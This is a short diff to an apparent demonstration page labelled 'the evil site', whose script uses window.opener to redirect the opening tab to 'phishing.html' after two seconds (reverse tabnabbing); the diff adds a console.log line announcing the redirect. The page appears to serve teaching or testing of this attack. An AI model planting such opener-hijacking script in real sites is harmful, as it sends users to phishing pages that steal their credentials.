@@ -8,6 +8,7 @@
     <p>This is the evil site. Wait a few seconds...</p>
     <script>
       if (window.opener) {
+        console.log("Redirecting to phishing page...", window.opener);
         setTimeout(function () {
           window.opener.location.replace("phishing.html");
         }, 2000); // Delay for 2 seconds
